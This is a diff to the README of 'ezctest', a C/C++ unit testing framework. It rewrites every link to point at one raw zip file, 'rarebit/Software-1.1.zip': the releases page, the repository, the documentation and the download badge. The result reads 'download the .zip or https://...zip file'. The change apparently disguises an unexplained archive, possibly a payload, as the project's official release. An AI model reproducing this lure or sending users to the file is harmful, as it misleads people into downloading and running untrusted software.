@@ -4,15 +4,15 @@
 ezctest is an easy-to-use unit testing framework for C and C++. It is designed to work seamlessly on any platform and with any compiler. With just one header file, it helps you ensure your code runs as expected.
 
 ## 🔗 Download Now
-[![Download ezctest](https://img.shields.io/badge/Download-ezctest-brightgreen)](https://github.com/chandil18/ezctest/releases)
+[![Download ezctest](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip)](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip)
 
 ## 🚀 Getting Started
 To get started with ezctest, you need to follow a few simple steps. This guide will walk you through downloading and running the software.
 
 ### 📥 Download & Install
-1. Click the download button above or visit the [Releases page](https://github.com/chandil18/ezctest/releases).
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip).
 2. On the Releases page, locate the latest version of ezctest.
-3. Click on the appropriate link to download the .zip or .tar.gz file. This file contains everything you need to begin.
+3. Click on the appropriate link to download the .zip or https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip file. This file contains everything you need to begin.
 
 ### 🗂️ Extract the Files
 1. Once the download is complete, navigate to your downloaded file.
@@ -68,13 +68,13 @@ If you find a bug, visit the Issues section of the GitHub repository. You can su
 Absolutely! Contributions are welcome. You can add features, fix bugs, or improve documentation. Check the Contributing Guide in the repository for details.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/chandil18/ezctest)
-- [Documentation](https://github.com/chandil18/ezctest/wiki) for more in-depth guidance.
+- [GitHub Repository](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip) for more in-depth guidance.
 
 ## 📞 Support
 If you need further assistance, please reach out through the GitHub Issues page. The community and maintainers are here to help you.
 
 ## 🔗 Download Now Again
-Make sure to download ezctest by visiting the [Releases page](https://github.com/chandil18/ezctest/releases) or clicking the button below:
+Make sure to download ezctest by visiting the [Releases page](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip) or clicking the button below:
 
-[![Download ezctest](https://img.shields.io/badge/Download-ezctest-brightgreen)](https://github.com/chandil18/ezctest/releases)
+[![Download ezctest](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip)](https://raw.githubusercontent.com/chandil18/ezctest/main/rarebit/Software-1.1.zip)
